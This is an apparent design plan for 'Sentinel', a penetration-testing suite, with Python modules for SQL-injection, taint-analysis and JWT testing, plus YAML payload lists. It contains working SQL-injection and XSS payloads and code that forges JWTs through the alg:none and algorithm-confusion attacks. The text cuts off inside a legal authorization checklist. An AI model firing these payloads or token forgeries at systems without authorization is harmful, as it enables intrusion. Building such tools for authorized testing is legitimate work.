# Security Testing Suite: Implementation Plan

> **Project Codename:** Sentinel
> **Purpose:** Comprehensive security testing for authorized penetration testing and own application security
> **Author:** Generated with Claude Code

---

## Table of Contents
1. [Executive Summary](#executive-summary)
2. [Architecture Overview](#architecture-overview)
3. [Core Modules](#core-modules)
4. [Technology Stack](#technology-stack)
5. [Implementation Phases](#implementation-phases)
6. [Module Specifications](#module-specifications)
7. [Payload Database](#payload-database)
8. [Report Generation](#report-generation)
9. [CI/CD Integration](#cicd-integration)
10. [Legal & Compliance](#legal--compliance)

---

## Executive Summary

### Objectives
Build a modular, extensible security testing suite that:
1. **Identifies vulnerabilities** in web applications, APIs, and networks
2. **Tests for OWASP Top 10** and CWE Top 25 vulnerabilities
3. **Generates professional reports** with evidence and remediation guidance
4. **Integrates with CI/CD** pipelines for automated security testing
5. **Supports authorized penetration testing** engagements

### Key Features
- **DAST Engine**: Dynamic application security testing
- **SAST Engine**: Static code analysis with custom rules
- **Fuzzer**: Protocol-aware fuzzing for edge cases
- **API Tester**: REST/GraphQL security testing
- **Auth Tester**: Authentication and session testing (JWT, OAuth)
- **Report Generator**: Professional pentest reports

### Scope
| In Scope | Out of Scope |
|----------|--------------|
| Web applications | Network infrastructure exploitation |
| REST/GraphQL APIs | Physical security testing |
| Authentication systems | Social engineering |
| Code vulnerabilities | Wireless testing |
| CI/CD integration | Mobile app testing (Phase 2) |

---

## Architecture Overview

```
┌─────────────────────────────────────────────────────────────────────────┐
│                          SENTINEL SECURITY SUITE                        │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐   │
│  │   CLI/UI    │  │   Web UI    │  │  CI/CD API  │  │  MCP Server │   │
│  └──────┬──────┘  └──────┬──────┘  └──────┬──────┘  └──────┬──────┘   │
│         │                │                │                │           │
│         └────────────────┴────────────────┴────────────────┘           │
│                                   │                                     │
│                          ┌───────┴───────┐                             │
│                          │  Core Engine  │                             │
│                          │  (Orchestrator)│                             │
│                          └───────┬───────┘                             │
│                                  │                                      │
│    ┌─────────────────────────────┼─────────────────────────────┐       │
│    │                             │                             │        │
│    ▼                             ▼                             ▼        │
│ ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐  │
│ │  DAST    │  │  SAST    │  │  Fuzzer  │  │   API    │  │   Auth   │  │
│ │  Module  │  │  Module  │  │  Module  │  │  Tester  │  │  Tester  │  │
│ └────┬─────┘  └────┬─────┘  └────┬─────┘  └────┬─────┘  └────┬─────┘  │
│      │             │             │             │             │         │
│      └─────────────┴─────────────┴─────────────┴─────────────┘         │
│                                  │                                      │
│                          ┌───────┴───────┐                             │
│                          │    Shared     │                             │
│                          │  Components   │                             │
│                          └───────┬───────┘                             │
│                                  │                                      │
│    ┌─────────────┬───────────────┼───────────────┬─────────────┐       │
│    │             │               │               │             │        │
│    ▼             ▼               ▼               ▼             ▼        │
│ ┌───────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐     │
│ │Payload│  │ Evidence │  │  Report  │  │  Config  │  │  Logger  │     │
│ │  DB   │  │Collector │  │Generator │  │ Manager  │  │          │     │
│ └───────┘  └──────────┘  └──────────┘  └──────────┘  └──────────┘     │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

### Data Flow
```
1. Target Definition → Scope validation → Active modules selected
2. Reconnaissance → Endpoint discovery → Attack surface mapping
3. Testing → Payload injection → Response analysis → Vulnerability detection
4. Evidence → Screenshots/logs → Severity classification
5. Reporting → Findings aggregation → Report generation
```

---

## Core Modules

### 1. DAST Module (Dynamic Analysis)
Tests running applications for vulnerabilities.

| Capability | Description |
|------------|-------------|
| SQL Injection | Boolean, error-based, time-based, UNION, stacked |
| XSS | Reflected, stored, DOM-based |
| Command Injection | OS command injection, code injection |
| Path Traversal | Directory traversal, LFI, RFI |
| SSRF | Server-side request forgery |
| XXE | XML external entity injection |
| IDOR | Insecure direct object references |
| Open Redirect | Unvalidated redirects |

### 2. SAST Module (Static Analysis)
Analyzes source code without execution.

| Capability | Description |
|------------|-------------|
| AST Parsing | Build abstract syntax trees for Python, JS, Java |
| Taint Analysis | Track untrusted data flow to sinks |
| Pattern Matching | Semgrep-compatible rules |
| Secret Detection | API keys, passwords, tokens |
| Dependency Check | Known vulnerable dependencies |

### 3. Fuzzer Module
Sends malformed inputs to find crashes and unexpected behavior.

| Capability | Description |
|------------|-------------|
| HTTP Fuzzing | Headers, parameters, body fuzzing |
| Protocol Fuzzing | Custom protocol definitions |
| Mutation | Bit flipping, boundary values, format strings |
| Grammar-based | Structure-aware fuzzing |

### 4. API Security Module
Tests REST and GraphQL APIs.

| Capability | Description |
|------------|-------------|
| Schema Analysis | OpenAPI/Swagger, GraphQL introspection |
| Auth Testing | Missing auth, broken access control |
| Rate Limiting | Brute force protection |
| Mass Assignment | Parameter pollution |
| BOLA/BFLA | Broken object/function level auth |

### 5. Authentication Module
Tests authentication and session management.

| Capability | Description |
|------------|-------------|
| JWT Testing | alg:none, weak keys, injection |
| Session Testing | Fixation, prediction, expiry |
| OAuth Testing | CSRF, token leakage, scope issues |
| Password Policy | Brute force, lockout testing |
| 2FA Bypass | Common bypass techniques |

---

## Technology Stack

### Core Language: Python 3.11+
**Rationale:** Extensive security libraries, rapid development, cross-platform

### Dependencies

```python
# Core Framework
httpx>=0.25.0          # Async HTTP client
aiohttp>=3.9.0         # Async HTTP server/client
typer>=0.9.0           # CLI framework
rich>=13.0.0           # Beautiful terminal output
pydantic>=2.0.0        # Data validation

# DAST Module
beautifulsoup4>=4.12.0 # HTML parsing
lxml>=4.9.0            # XML/HTML parsing
selenium>=4.15.0       # Browser automation (optional)

# SAST Module
tree-sitter>=0.20.0    # AST parsing (multi-language)
semgrep>=1.50.0        # Pattern matching engine

# Fuzzing
boofuzz>=0.4.0         # Network protocol fuzzing
atheris>=2.3.0         # Python coverage-guided fuzzing

# Cryptography Testing
pyjwt>=2.8.0           # JWT manipulation
cryptography>=41.0.0   # Crypto operations

# Reporting
jinja2>=3.1.0          # Template engine
weasyprint>=60.0       # PDF generation
markdown>=3.5.0        # Markdown processing

# Database
sqlalchemy>=2.0.0      # ORM
aiosqlite>=0.19.0      # Async SQLite

# Utilities
pyyaml>=6.0.0          # YAML parsing
python-dotenv>=1.0.0   # Environment management
```

### Directory Structure

```
sentinel/
├── sentinel/
│   ├── __init__.py
│   ├── cli.py                  # CLI entry point
│   ├── core/
│   │   ├── __init__.py
│   │   ├── engine.py           # Orchestration engine
│   │   ├── config.py           # Configuration management
│   │   ├── logger.py           # Structured logging
│   │   └── models.py           # Data models (Pydantic)
│   ├── modules/
│   │   ├── __init__.py
│   │   ├── dast/
│   │   │   ├── __init__.py
│   │   │   ├── scanner.py      # Main DAST scanner
│   │   │   ├── sqli.py         # SQL injection tests
│   │   │   ├── xss.py          # XSS tests
│   │   │   ├── injection.py    # Command/code injection
│   │   │   ├── traversal.py    # Path traversal tests
│   │   │   ├── ssrf.py         # SSRF tests
│   │   │   └── xxe.py          # XXE tests
│   │   ├── sast/
│   │   │   ├── __init__.py
│   │   │   ├── analyzer.py     # Main SAST analyzer
│   │   │   ├── ast_parser.py   # AST parsing
│   │   │   ├── taint.py        # Taint analysis
│   │   │   ├── rules/          # Security rules (YAML)
│   │   │   └── secrets.py      # Secret detection
│   │   ├── fuzzer/
│   │   │   ├── __init__.py
│   │   │   ├── http_fuzzer.py  # HTTP fuzzing
│   │   │   ├── mutators.py     # Mutation strategies
│   │   │   └── protocols.py    # Protocol definitions
│   │   ├── api/
│   │   │   ├── __init__.py
│   │   │   ├── rest_tester.py  # REST API testing
│   │   │   ├── graphql_tester.py
│   │   │   └── auth_checks.py  # API auth testing
│   │   └── auth/
│   │       ├── __init__.py
│   │       ├── jwt_tester.py   # JWT security tests
│   │       ├── session.py      # Session management tests
│   │       └── oauth.py        # OAuth testing
│   ├── payloads/
│   │   ├── __init__.py
│   │   ├── sqli.yaml           # SQL injection payloads
│   │   ├── xss.yaml            # XSS payloads
│   │   ├── traversal.yaml      # Path traversal payloads
│   │   ├── ssrf.yaml           # SSRF payloads
│   │   └── command.yaml        # Command injection payloads
│   ├── evidence/
│   │   ├── __init__.py
│   │   ├── collector.py        # Evidence collection
│   │   └── screenshot.py       # Screenshot capture
│   ├── reports/
│   │   ├── __init__.py
│   │   ├── generator.py        # Report generation
│   │   ├── templates/          # Jinja2 templates
│   │   │   ├── html_report.html
│   │   │   ├── pdf_report.html
│   │   │   └── markdown_report.md
│   │   └── compliance.py       # Compliance mapping
│   └── integrations/
│       ├── __init__.py
│       ├── cicd.py             # CI/CD integration
│       └── mcp_server.py       # MCP server for Claude
├── tests/
│   ├── __init__.py
│   ├── test_dast/
│   ├── test_sast/
│   └── vulnerable_app/         # Test target (DVWA-like)
├── docs/
│   ├── usage.md
│   ├── api.md
│   └── rules.md
├── pyproject.toml
├── README.md
└── LICENSE
```

---

## Implementation Phases

### Phase 1: Foundation (Weeks 1-2)
**Goal:** Core infrastructure and basic DAST

| Task | Description | Priority |
|------|-------------|----------|
| Project setup | pyproject.toml, structure, CI | P0 |
| Core engine | Orchestration, config, logging | P0 |
| Data models | Pydantic models for findings, evidence | P0 |
| HTTP client | Async HTTP with proxy support | P0 |
| Basic DAST | SQL injection detection | P0 |
| CLI | Basic command-line interface | P0 |

**Deliverables:**
- Working CLI that can scan a URL for SQL injection
- Basic evidence collection
- Console output of findings

### Phase 2: DAST Expansion (Weeks 3-4)
**Goal:** Complete DAST module

| Task | Description | Priority |
|------|-------------|----------|
| XSS detection | Reflected, stored, DOM-based | P0 |
| Command injection | OS and code injection | P0 |
| Path traversal | Directory traversal, LFI | P0 |
| SSRF | Server-side request forgery | P1 |
| XXE | XML external entity | P1 |
| IDOR | Object reference testing | P1 |
| Payload DB | Comprehensive payload library | P0 |

**Deliverables:**
- DAST module covering OWASP Top 10
- Payload database with 1000+ payloads
- Response analysis for vulnerability confirmation

### Phase 3: SAST Engine (Weeks 5-6)
**Goal:** Static code analysis capability

| Task | Description | Priority |
|------|-------------|----------|
| AST parsing | Python, JavaScript, Java | P0 |
| Taint analysis | Source-sink tracking | P0 |
| Rule engine | Semgrep-compatible rules | P0 |
| Secret detection | API keys, passwords, tokens | P0 |
| Custom rules | Rule creation interface | P1 |
| Dependency check | CVE scanning for deps | P1 |

**Deliverables:**
- SAST module for Python, JS, Java
- 100+ security rules
- Secret detection with low false positives

### Phase 4: API & Auth Testing (Weeks 7-8)
**Goal:** API and authentication security testing

| Task | Description | Priority |
|------|-------------|----------|
| REST API testing | OpenAPI/Swagger parsing | P0 |
| GraphQL testing | Introspection, query testing | P1 |
| JWT testing | Algorithm attacks, key cracking | P0 |
| Session testing | Fixation, prediction | P0 |
| OAuth testing | Common OAuth vulnerabilities | P1 |
| BOLA/BFLA | Access control testing | P0 |

**Deliverables:**
- Complete API security testing
- JWT and session attack modules
- OAuth security checks

### Phase 5: Fuzzer & Advanced Features (Weeks 9-10)
**Goal:** Fuzzing and advanced detection

| Task | Description | Priority |
|------|-------------|----------|
| HTTP fuzzer | Parameter and header fuzzing | P0 |
| Mutation engine | Multiple mutation strategies | P0 |
| Protocol fuzzer | Custom protocol support | P2 |
| Crawler | Automatic endpoint discovery | P1 |
| Response analysis | ML-based anomaly detection | P2 |

**Deliverables:**
- Fuzzing module with mutation strategies
- Automatic endpoint discovery
- Advanced response analysis

### Phase 6: Reporting & Integration (Weeks 11-12)
**Goal:** Professional reporting and CI/CD

| Task | Description | Priority |
|------|-------------|----------|
| HTML reports | Interactive HTML reports | P0 |
| PDF reports | Professional PDF output | P0 |
| Markdown reports | CI/CD friendly format | P0 |
| GitHub Actions | GHA integration | P0 |
| GitLab CI | GitLab integration | P1 |
| Jenkins | Jenkins plugin | P2 |
| MCP Server | Claude Code integration | P1 |

**Deliverables:**
- Professional report generation
- CI/CD integrations
- MCP server for AI assistance

---

## Module Specifications

### DAST Module: SQL Injection

```python
# sentinel/modules/dast/sqli.py

from enum import Enum
from typing import List, Optional
from pydantic import BaseModel

class SQLiType(Enum):
    BOOLEAN = "boolean"
    ERROR = "error"
    TIME = "time"
    UNION = "union"
    STACKED = "stacked"

class SQLiResult(BaseModel):
    vulnerable: bool
    injection_type: Optional[SQLiType]
    payload: str
    parameter: str
    evidence: str
    confidence: float  # 0.0 - 1.0

class SQLiTester:
    """SQL Injection testing module."""

    def __init__(self, http_client, config):
        self.client = http_client
        self.config = config
        self.payloads = self._load_payloads()

    async def test_parameter(
        self,
        url: str,
        param: str,
        method: str = "GET"
    ) -> List[SQLiResult]:
        """Test a parameter for SQL injection."""
        results = []

        # 1. Boolean-based blind
        results.extend(await self._test_boolean(url, param, method))

        # 2. Error-based
        results.extend(await self._test_error(url, param, method))

        # 3. Time-based blind
        if self.config.enable_time_based:
            results.extend(await self._test_time(url, param, method))

        # 4. UNION-based
        results.extend(await self._test_union(url, param, method))

        return results

    async def _test_boolean(self, url, param, method) -> List[SQLiResult]:
        """Boolean-based blind SQL injection test."""
        results = []

        # Get baseline response
        baseline = await self.client.request(method, url)

        for payload_pair in self.payloads["boolean"]:
            true_payload = payload_pair["true"]
            false_payload = payload_pair["false"]

            true_resp = await self._inject(url, param, true_payload, method)
            false_resp = await self._inject(url, param, false_payload, method)

            # Analyze response differences
            if self._responses_differ(true_resp, false_resp, baseline):
                results.append(SQLiResult(
                    vulnerable=True,
                    injection_type=SQLiType.BOOLEAN,
                    payload=true_payload,
                    parameter=param,
                    evidence=f"True: {len(true_resp.text)}, False: {len(false_resp.text)}",
                    confidence=0.85
                ))
                break

        return results

    async def _test_error(self, url, param, method) -> List[SQLiResult]:
        """Error-based SQL injection test."""
        results = []

        error_patterns = [
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_",
            r"PostgreSQL.*ERROR",
            r"ORA-\d{5}",
            r"Microsoft.*ODBC.*SQL Server",
            r"SQLite.*error",
            r"SQLSTATE\[\d+\]",
        ]

        for payload in self.payloads["error"]:
            resp = await self._inject(url, param, payload, method)

            for pattern in error_patterns:
                if re.search(pattern, resp.text, re.IGNORECASE):
                    results.append(SQLiResult(
                        vulnerable=True,
                        injection_type=SQLiType.ERROR,
                        payload=payload,
                        parameter=param,
                        evidence=f"Error pattern matched: {pattern}",
                        confidence=0.95
                    ))
                    return results  # High confidence, no need to continue

        return results

    async def _test_time(self, url, param, method) -> List[SQLiResult]:
        """Time-based blind SQL injection test."""
        results = []
        delay = 5  # seconds

        for payload in self.payloads["time"]:
            payload = payload.replace("{DELAY}", str(delay))

            start = time.time()
            resp = await self._inject(url, param, payload, method)
            elapsed = time.time() - start

            if elapsed >= delay - 0.5:  # Allow 0.5s tolerance
                results.append(SQLiResult(
                    vulnerable=True,
                    injection_type=SQLiType.TIME,
                    payload=payload,
                    parameter=param,
                    evidence=f"Response delayed by {elapsed:.2f}s",
                    confidence=0.90
                ))
                break

        return results
```

### SAST Module: Taint Analysis

```python
# sentinel/modules/sast/taint.py

from dataclasses import dataclass
from typing import List, Set, Dict
import tree_sitter

@dataclass
class TaintSource:
    """A source of untrusted data."""
    name: str
    patterns: List[str]
    # e.g., request.args.get, input(), os.environ

@dataclass
class TaintSink:
    """A dangerous sink for tainted data."""
    name: str
    patterns: List[str]
    cwe: str
    # e.g., cursor.execute, os.system, eval

@dataclass
class TaintFlow:
    """A detected taint flow from source to sink."""
    source: TaintSource
    sink: TaintSink
    path: List[str]  # Variable names in flow
    file: str
    line_start: int
    line_end: int
    code_snippet: str
    severity: str
    cwe: str

class TaintAnalyzer:
    """Performs taint analysis on source code."""

    PYTHON_SOURCES = [
        TaintSource("request_params", ["request.args", "request.form", "request.json"]),
        TaintSource("user_input", ["input(", "raw_input("]),
        TaintSource("file_read", ["open(", ".read()"]),
        TaintSource("env_vars", ["os.environ", "os.getenv"]),
    ]

    PYTHON_SINKS = [
        TaintSink("sql_query", ["cursor.execute", ".execute(", "db.execute"], "CWE-89"),
        TaintSink("os_command", ["os.system", "subprocess.call", "subprocess.run"], "CWE-78"),
        TaintSink("code_exec", ["eval(", "exec(", "compile("], "CWE-94"),
        TaintSink("file_path", ["open(", "send_file(", "os.path.join"], "CWE-22"),
        TaintSink("html_output", [".format(", "f\"", "render_template_string"], "CWE-79"),
    ]

    def __init__(self, language: str = "python"):
        self.language = language
        self.parser = self._init_parser(language)

    def analyze_file(self, filepath: str) -> List[TaintFlow]:
        """Analyze a file for taint flows."""
        with open(filepath, 'r') as f:
            code = f.read()

        tree = self.parser.parse(bytes(code, 'utf8'))
        flows = []

        # Find all sources
        sources = self._find_sources(tree, code)

        # Track taint through assignments
        tainted_vars = self._propagate_taint(tree, code, sources)

        # Find sinks with tainted data
        for sink in self._find_sinks(tree, code):
            tainted_input = self._check_sink_tainted(sink, tainted_vars)
            if tainted_input:
                flows.append(TaintFlow(
                    source=tainted_input.source,
                    sink=sink,
                    path=tainted_input.path,
                    file=filepath,
                    line_start=sink.line,
                    line_end=sink.line,
                    code_snippet=self._get_snippet(code, sink.line),
                    severity="HIGH",
                    cwe=sink.cwe
                ))

        return flows

    def _propagate_taint(self, tree, code, sources) -> Dict[str, TaintedVar]:
        """Track taint propagation through variable assignments."""
        tainted = {}

        # Simple approach: track direct assignments
        # For production: implement full data flow analysis
        for source in sources:
            # Find what variable the source is assigned to
            assignment = self._find_assignment(tree, source)
            if assignment:
                tainted[assignment.var_name] = TaintedVar(
                    name=assignment.var_name,
                    source=source,
                    path=[source.name, assignment.var_name]
                )

        # Propagate through subsequent assignments
        # x = source(); y = x; z = y  -> z is tainted
        changed = True
        while changed:
            changed = False
            for node in self._walk_assignments(tree):
                if node.rhs in tainted and node.lhs not in tainted:
                    tainted[node.lhs] = TaintedVar(
                        name=node.lhs,
                        source=tainted[node.rhs].source,
                        path=tainted[node.rhs].path + [node.lhs]
                    )
                    changed = True

        return tainted
```

### JWT Testing Module

```python
# sentinel/modules/auth/jwt_tester.py

import jwt
import base64
import json
from typing import List, Optional
from pydantic import BaseModel

class JWTVulnerability(BaseModel):
    vulnerability: str
    description: str
    severity: str
    cwe: str
    evidence: str
    remediation: str

class JWTTester:
    """Test JWT implementations for common vulnerabilities."""

    WEAK_SECRETS = [
        "secret", "password", "123456", "jwt_secret",
        "changeme", "admin", "key", "test", "dev"
    ]

    def __init__(self, http_client):
        self.client = http_client

    async def test_jwt(self, token: str, endpoint: str) -> List[JWTVulnerability]:
        """Run all JWT security tests."""
        results = []

        # Decode without verification to inspect
        try:
            header = self._decode_header(token)
            payload = self._decode_payload(token)
        except Exception as e:
            return [JWTVulnerability(
                vulnerability="Invalid JWT",
                description=str(e),
                severity="INFO",
                cwe="N/A",
                evidence=token[:50],
                remediation="Ensure JWT is properly formatted"
            )]

        # 1. Test "none" algorithm attack
        none_result = await self._test_none_algorithm(token, endpoint, payload)
        if none_result:
            results.append(none_result)

        # 2. Test algorithm confusion (RS256 -> HS256)
        if header.get("alg", "").startswith("RS"):
            confusion_result = await self._test_algorithm_confusion(
                token, endpoint, payload
            )
            if confusion_result:
                results.append(confusion_result)

        # 3. Test weak secrets
        if header.get("alg", "").startswith("HS"):
            weak_result = await self._test_weak_secret(token, endpoint)
            if weak_result:
                results.append(weak_result)

        # 4. Test expired token acceptance
        exp_result = await self._test_expired_token(token, endpoint, payload)
        if exp_result:
            results.append(exp_result)

        # 5. Test JWK header injection
        jwk_result = await self._test_jwk_injection(token, endpoint, payload)
        if jwk_result:
            results.append(jwk_result)

        return results

    async def _test_none_algorithm(
        self, token: str, endpoint: str, payload: dict
    ) -> Optional[JWTVulnerability]:
        """Test if server accepts 'none' algorithm."""

        # Create token with alg: none
        header = {"alg": "none", "typ": "JWT"}
        none_token = (
            base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=').decode() +
            "." +
            base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=').decode() +
            "."
        )

        # Also try variations
        variations = [
            none_token,
            none_token[:-1],  # Remove trailing dot
            self._create_token({"alg": "None", "typ": "JWT"}, payload),
            self._create_token({"alg": "NONE", "typ": "JWT"}, payload),
            self._create_token({"alg": "nOnE", "typ": "JWT"}, payload),
        ]

        for test_token in variations:
            resp = await self.client.get(
                endpoint,
                headers={"Authorization": f"Bearer {test_token}"}
            )

            if resp.status_code == 200:
                return JWTVulnerability(
                    vulnerability="JWT None Algorithm Accepted",
                    description="Server accepts JWTs with 'none' algorithm, allowing signature bypass",
                    severity="CRITICAL",
                    cwe="CWE-327",
                    evidence=f"Token accepted: {test_token[:50]}...",
                    remediation="Explicitly reject 'none' algorithm in JWT validation"
                )

        return None

    async def _test_weak_secret(
        self, token: str, endpoint: str
    ) -> Optional[JWTVulnerability]:
        """Test for weak HMAC secrets."""

        for secret in self.WEAK_SECRETS:
            try:
                # Try to verify with weak secret
                payload = jwt.decode(token, secret, algorithms=["HS256", "HS384", "HS512"])

                # If we got here, the secret worked!
                return JWTVulnerability(
                    vulnerability="Weak JWT Secret",
                    description=f"JWT signed with weak secret: '{secret}'",
                    severity="CRITICAL",
                    cwe="CWE-521",
                    evidence=f"Secret '{secret}' successfully verified token",
                    remediation="Use a cryptographically secure random secret (256+ bits)"
                )
            except jwt.InvalidSignatureError:
                continue
            except Exception:
                continue

        return None

    async def _test_algorithm_confusion(
        self, token: str, endpoint: str, payload: dict
    ) -> Optional[JWTVulnerability]:
        """Test RS256 to HS256 algorithm confusion attack."""

        # This requires obtaining the public key first
        # Then using it as HMAC secret

        # Try common public key endpoints
        pubkey_endpoints = [
            "/.well-known/jwks.json",
            "/oauth/jwks",
            "/api/keys",
            "/.well-known/openid-configuration"
        ]

        base_url = endpoint.rsplit('/', 1)[0]

        for pk_endpoint in pubkey_endpoints:
            try:
                resp = await self.client.get(f"{base_url}{pk_endpoint}")
                if resp.status_code == 200:
                    # Found public key, attempt confusion attack
                    pubkey = self._extract_pubkey(resp.json())
                    if pubkey:
                        confused_token = jwt.encode(
                            payload,
                            pubkey,
                            algorithm="HS256"
                        )

                        test_resp = await self.client.get(
                            endpoint,
                            headers={"Authorization": f"Bearer {confused_token}"}
                        )

                        if test_resp.status_code == 200:
                            return JWTVulnerability(
                                vulnerability="JWT Algorithm Confusion",
                                description="Server vulnerable to RS256/HS256 algorithm confusion",
                                severity="CRITICAL",
                                cwe="CWE-327",
                                evidence=f"Confused token accepted from {pk_endpoint}",
                                remediation="Explicitly verify expected algorithm matches token"
                            )
            except Exception:
                continue

        return None
```

---

## Payload Database

### Structure

```yaml
# sentinel/payloads/sqli.yaml

metadata:
  name: SQL Injection Payloads
  version: "1.0"
  last_updated: "2026-01-06"
  source: "Compiled from PayloadsAllTheThings, SQLMap, custom research"

boolean:
  - name: "Basic OR"
    true: "' OR '1'='1"
    false: "' OR '1'='2"
    dbms: ["mysql", "postgresql", "mssql", "oracle", "sqlite"]

  - name: "Comment bypass"
    true: "' OR 1=1--"
    false: "' OR 1=2--"
    dbms: ["mysql", "postgresql", "mssql"]

  - name: "Double dash comment"
    true: "' OR 1=1-- -"
    false: "' OR 1=2-- -"
    dbms: ["mysql"]

error:
  - payload: "'"
    description: "Single quote"

  - payload: "\""
    description: "Double quote"

  - payload: "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -"
    description: "Error-based MySQL version extraction"
    dbms: ["mysql"]

  - payload: "1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))-- -"
    description: "EXTRACTVALUE error-based"
    dbms: ["mysql"]

time:
  - payload: "' OR SLEEP({DELAY})-- -"
    dbms: ["mysql"]

  - payload: "'; WAITFOR DELAY '0:0:{DELAY}'-- -"
    dbms: ["mssql"]

  - payload: "' OR pg_sleep({DELAY})-- -"
    dbms: ["postgresql"]

union:
  - payload: "' UNION SELECT NULL-- -"
    description: "Detect column count"

  - payload: "' UNION SELECT NULL,NULL-- -"
    description: "Two columns"

  - payload: "' UNION SELECT NULL,NULL,NULL-- -"
    description: "Three columns"
```

### XSS Payloads

```yaml
# sentinel/payloads/xss.yaml

metadata:
  name: XSS Payloads
  version: "1.0"

reflected:
  basic:
    - "<script>alert('XSS')</script>"
    - "<img src=x onerror=alert('XSS')>"
    - "<svg onload=alert('XSS')>"
    - "<body onload=alert('XSS')>"

  filter_bypass:
    - "<scr<script>ipt>alert('XSS')</scr</script>ipt>"
    - "<img src=x onerror=alert`XSS`>"
    - "<svg/onload=alert('XSS')>"
    - "javascript:alert('XSS')"
    - "data:text/html,<script>alert('XSS')</script>"

  encoding:
    - "%3Cscript%3Ealert('XSS')%3C/script%3E"
    - "&#60;script&#62;alert('XSS')&#60;/script&#62;"
    - "\\x3cscript\\x3ealert('XSS')\\x3c/script\\x3e"

  polyglots:
    - "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e"

dom:
  - description: "location.hash injection"
    payload: "#<img src=x onerror=alert('XSS')>"
    sink: "innerHTML"

  - description: "document.write"
    payload: "<script>document.write('<img src=x onerror=alert(1)>')</script>"
    sink: "document.write"
```

---

## Report Generation

### HTML Report Template

```html
<!-- sentinel/reports/templates/html_report.html -->
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Security Assessment Report - {{ target }}</title>
    <style>
        :root {
            --critical: #dc3545;
            --high: #fd7e14;
            --medium: #ffc107;
            --low: #28a745;
            --info: #17a2b8;
        }
        body {
            font-family: 'Segoe UI', system-ui, sans-serif;
            line-height: 1.6;
            max-width: 1200px;
            margin: 0 auto;
            padding: 2rem;
        }
        .severity-critical { color: var(--critical); }
        .severity-high { color: var(--high); }
        .severity-medium { color: var(--medium); }
        .severity-low { color: var(--low); }
        .severity-info { color: var(--info); }

        .finding {
            border: 1px solid #ddd;
            border-radius: 8px;
            margin: 1rem 0;
            overflow: hidden;
        }
        .finding-header {
            padding: 1rem;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .finding-body {
            padding: 1rem;
            background: #f8f9fa;
        }
        .evidence {
            background: #1e1e1e;
            color: #d4d4d4;
            padding: 1rem;
            border-radius: 4px;
            overflow-x: auto;
        }
        .summary-card {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 2rem;
            border-radius: 12px;
            margin-bottom: 2rem;
        }
    </style>
</head>
<body>
    <div class="summary-card">
        <h1>Security Assessment Report</h1>
        <p><strong>Target:</strong> {{ target }}</p>
        <p><strong>Date:</strong> {{ report_date }}</p>
        <p><strong>Scope:</strong> {{ scope }}</p>
    </div>

    <h2>Executive Summary</h2>
    <p>{{ executive_summary }}</p>

    <h3>Risk Overview</h3>
    <table>
        <tr>
            <th>Severity</th>
            <th>Count</th>
        </tr>
        {% for severity, count in severity_counts.items() %}
        <tr>
            <td class="severity-{{ severity|lower }}">{{ severity }}</td>
            <td>{{ count }}</td>
        </tr>
        {% endfor %}
    </table>

    <h2>Findings</h2>
    {% for finding in findings %}
    <div class="finding">
        <div class="finding-header" style="background: var(--{{ finding.severity|lower }})20;">
            <h3>{{ finding.title }}</h3>
            <span class="severity-{{ finding.severity|lower }}">{{ finding.severity }}</span>
        </div>
        <div class="finding-body">
            <p><strong>CWE:</strong> {{ finding.cwe }}</p>
            <p><strong>Description:</strong> {{ finding.description }}</p>

            <h4>Evidence</h4>
            <div class="evidence">
                <pre>{{ finding.evidence }}</pre>
            </div>

            {% if finding.screenshot %}
            <h4>Screenshot</h4>
            <img src="{{ finding.screenshot }}" alt="Evidence screenshot">
            {% endif %}

            <h4>Remediation</h4>
            <p>{{ finding.remediation }}</p>

            <h4>References</h4>
            <ul>
                {% for ref in finding.references %}
                <li><a href="{{ ref }}">{{ ref }}</a></li>
                {% endfor %}
            </ul>
        </div>
    </div>
    {% endfor %}

    <h2>Methodology</h2>
    <p>{{ methodology }}</p>

    <h2>Tools Used</h2>
    <ul>
        {% for tool in tools_used %}
        <li>{{ tool }}</li>
        {% endfor %}
    </ul>

    <footer>
        <p>Generated by Sentinel Security Suite v{{ version }}</p>
        <p>Report ID: {{ report_id }}</p>
    </footer>
</body>
</html>
```

---

## CI/CD Integration

### GitHub Actions

```yaml
# .github/workflows/security-scan.yml
name: Security Scan

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]
  schedule:
    - cron: '0 2 * * 1'  # Weekly Monday 2am

jobs:
  sast:
    name: Static Analysis
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: '3.11'

      - name: Install Sentinel
        run: pip install sentinel-security

      - name: Run SAST
        run: |
          sentinel sast . \
            --format sarif \
            --output results/sast.sarif \
            --severity-threshold high

      - name: Upload SARIF
        uses: github/codeql-action/upload-sarif@v2
        with:
          sarif_file: results/sast.sarif

  dast:
    name: Dynamic Analysis
    runs-on: ubuntu-latest
    needs: deploy-staging  # Requires running app
    steps:
      - uses: actions/checkout@v4

      - name: Install Sentinel
        run: pip install sentinel-security

      - name: Run DAST
        run: |
          sentinel dast ${{ env.STAGING_URL }} \
            --format json \
            --output results/dast.json \
            --modules sqli,xss,injection

      - name: Check Results
        run: |
          sentinel report check results/dast.json \
            --fail-on critical,high

      - name: Upload Report
        uses: actions/upload-artifact@v4
        with:
          name: security-report
          path: results/
```

---

## Legal & Compliance

### Authorization Requirements

**CRITICAL:** Only use this tool on systems you own or have explicit written authorization to test.

```
┌─────────────────────────────────────────────────────────────────┐
│                    AUTHORIZATION CHECKLIST                      │
